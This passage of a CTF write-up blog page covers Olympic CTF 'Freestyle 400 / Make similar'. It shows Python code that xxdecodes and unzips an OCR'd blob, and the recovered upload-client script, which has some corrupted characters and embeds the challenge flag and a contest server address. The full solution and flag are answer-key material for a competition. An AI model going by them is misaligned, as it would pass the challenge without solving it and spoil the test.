+hcZHRaWYEHRBGFGtqk-cMV7oqqQRzbobGRB9Kwc-pTHzCDSSMJorR8d-pxdqd  
+hLWpvQWRv-N33mFwEicqz+UFkDYsbDvrfOC7tko5g1JrrSX0swhn64neLsohr  
+h26K1mSxnS+TF1Cta8GHHQ-t1Cfp7nh-oZeFuVi5MEynqyzX8kMtXcAynSLQx  
+hg4o56Pu4YUZHMqDGtczKeCwXU8PZEc4lY0FbDfFfgZpJFC-a-sHGLtGJgCMZ  
+hksr6XNTedEUdVJqxOO5VaReoH68eEPJ2m6d9mKhlhVE7zw4Yru4DUWRCJH28  
+hyeth+l2IOgPnEfrTLwAc+-TPS0YKYY3K0np58gVPgdAN8RY7+rQfRDin9JSa  
+hOG32WG7-rTl3uthvrnDO-wD09GDIRCniuoefs8UsfiWZOLq+0awOrQxAPM+C  
+hxLwOJ9VUKwdn7dJduLn1KhBucvL1pr5lGiBFfUbL79cFFex+G27kT+fsQ7X5  
+h87mgPivWhDSQHKPXqpKGniDkYsIYpg66ZWbHp4PfcgtPukElDWENlQPSuNAQ  
+hnboE4Bd8kyyokt67GgfGvBVS45sMFPtlgKRlG-QPFSgbMHujA3qYemxnuqGx  
+hp97aXpdKpvAE8zx-oUzazoVFz32X3OxAuiWJhKEjaYKpM7f95yvlS62v+k++  
++
+end  
+</code></pre>
+
+<p>We tried to UUdecode it with no luck until we realized it was no <a href="http://en.wikipedia.org/wiki/Uuencode">UUEncoding</a> but <a href="http://en.wikipedia.org/wiki/Xxencoding">XXEncoding</a> that only uses alpha characters and the "+" symbol and that you can easily recognize for the lines starting with "h"s.</p>
+
+<p>Based on the info on the wikipedia, I wrote this simple script to decode it:</p>
+
+<pre><code class="language-lang-python line-numbers "># XXdecoding
+decoded = ""  
+for line in encoded.split('\n'):  
+    line = line [1:]
+    for char in line:
+        ref = xxset.index(char)
+        binref = str(bin(ref))[2:]
+        binref = "0" * (6-len(binref)) + binref
+        decoded += binref
+data = hex(int(decoded, 2))[2:-1].decode("hex")  
+</code></pre>
+
+<p>The resulting bytes were identified as a gzipped archive and can be unarchived even if corrupted bytes are present (thing we were sure about since the manual OCR was hard).</p>
+
+<pre><code class="language-lang-bash line-numbers ">alvaro@winterfell ~/D/O/Freestyle400_Make similar&gt; file fax  
+fax: gzip compressed data, was "rfax_man.py", from FAT filesystem (MS-DOS, OS/2, NT), last modified: Thu Feb  6 17:52:39 2014, max speed  
+</code></pre>
+
+<p>Full script to get xxencoded file contents:</p>
+
+<pre><code class="language-lang-python line-numbers ">import zlib
+
+xxset = "+-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"  
+encoded = """h5sg60BSxwp62+57aMLVTPK3i9b-t+5pGLKyPA-FxxuysvFs+BT8+o0dVsM24  
+hcZHRaWYEHRBGFGtqk-cMV7oqqQRzbobGRB9Kwc-pTHzCDSSMJorR8d-pxdqd  
+hLWpvQWRv-N33mFwEicqz+UFkDYsbDvrfOC7tko5g1JrrSX0swhn64neLsohr  
+h26K1mSxnS+TF1Cta8GHHQ-t1Cfp7nh-oZeFuVi5MEynqyzX8kMtXcAynSLQx  
+hg4o56Pu4YUZHMqDGtczKeCwXU8PZEc4lY0FbDfFfgZpJFC-a-sHGLtGJgCMZ  
+hksr6XNTedEUdVJqxOO5VaReoH68eEPJ2m6d9mKhlhVE7zw4Yru4DUWRCJH28  
+hyeth+l2IOgPnEfrTLwAc+-TPS0YKYY3K0np58gVPgdAN8RY7+rQfRDin9JSa  
+hOG32WG7-rTl3uthvrnDO-wD09GDIRCniuoefs8UsfiWZOLq+0awOrQxAPM+C  
+hxLwOJ9VUKwdn7dJduLn1KhBucvL1pr5lGiBFfUbL79cFFex+G27kT+fsQ7X5  
+h87mgPivWhDSQHKPXqpKGniDkYsIYpg66ZWbHp4PfcgtPukElDWENlQPSuNAQ  
+hnboE4Bd8kyyokt67GgfGvBVS45sMFPtlgKRlG-QPFSgbMHujA3qYemxnuqGx  
+hp97aXpdKpvAE8zx-oUzazoVFz32X3OxAuiWJhKEjaYKpM7f95yvlS62v+k++"""
+
+# XXdecoding
+decoded = ""  
+for line in encoded.split('\n'):  
+    line = line [1:]
+    for char in line:
+        ref = xxset.index(char)
+        binref = str(bin(ref))[2:]
+        binref = "0" * (6-len(binref)) + binref
+        decoded += binref
+data = hex(int(decoded, 2))[2:-1].decode("hex")
+
+# unziping
+try:  
+    z = zlib.decompressobj(-15)
+    print z.decompress(data[22:])  # skip the gzip header
+except:  
+    pass
+</code></pre>
+
+<p>The result is a python script with some corrupted chars but the Flag is Ok and can be read it:</p>
+
+<pre><code class="language-lang-python line-numbers ">import socket,os,sys,hashlib
+
+KEY  = "CTF{4BDF4498E4922B88642D4915C528DA8F}" # DO NOT SHARE THIS!  
+HOST = '109.233.61.11'  
+PORT = 8001
+
+if len(sys.argv)&lt;3:  
+  print 'Usage: rfax_man.py add|del file.png'
+  print '\nAdd your pictures to transmission!\nSizes: 800&lt;=width&lt;=3200 and oeight/width &lt;= 2.0.\nUse contrast grayscale pictures.'
+  sys.exit(()
+
+data=open(sys.argv[2],'rb').read(100000()
+
+m=hashlib.md5(); m.update(KEY); KEYH=m.hexdigest().upper()  
+m=hashlib.md5(); m.update(data); h=m.hexdigest().upper()  
+print 'File hash',h
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
+s.connect((HOST, PORT))  
+print 'Connected.'
+
+if sys.argv[1]=='add':  
+  s.sendall(KEYH+':ADD:'+data)
+  s.shutdown(socket.SHUT_WR)
+  print s.recv(1024)
+elif sys.argv[1]=='del':  
+  s.sendall(KEYH+':DEL:'+h)
+  print s.recv(1024)
+
+s.close()  
+print 'Done.'  
+</code></pre>
+    </section>
+    <footer class="post-indexfooter">
+        <i class="fa fa-comments"></i> <a href="../../blog/2014/02/10/olympic-ctf-freestyle-400-make-similar-write-up/index.html#disqus_thread">Comments</a>
+    </footer>
+</article>
+
+
+<nav class="pagination" role="navigation">
+        <a class="newer-posts" href="../3/"><span aria-hidden="true">←</span> Newer Posts</a>
+    <span class="page-number">Page 4 of 14</span>
+        <a class="older-posts" href="../5/">Older Posts <span aria-hidden="true">→</span></a>
+</nav>
+
+    </main>
+
+    <!-- You can safely delete this line if your theme does not require jQuery -->
+<script type="text/javascript" src="https://code.jquery.com/jquery-1.11.3.min.js"></script>
+
+    <script src="../../assets/js/instantclick.min.js?v=d47df0f104" data-no-instant></script>
+    <script data-no-instant>InstantClick.init();</script>
+    <script data-no-instant>
+        InstantClick.on('change', function() {
+            prism_markdown();
+            Prism.highlightAll();
+        });
+        InstantClick.init();
+    </script>
+
+    <script type="text/javascript">
+        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+        var disqus_shortname = 'pwntester'; // required: replace example with your forum shortname
+        /* * * DON'T EDIT BELOW THIS LINE * * */
+        (function () {
+            var s = document.createElement('script'); s.async = true;
+            s.type = 'text/javascript';
+            s.src = '//' + disqus_shortname + '.disqus.com/count.js';
+            (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s);
+        }());
+    </script>
+
+    <script type="text/javascript" src="../../assets/js/prism-loader.js?v=d47df0f104"></script>
+    <script type="text/javascript" src="../../assets/js/prism.js?v=d47df0f104"></script>
+
+</body>
+
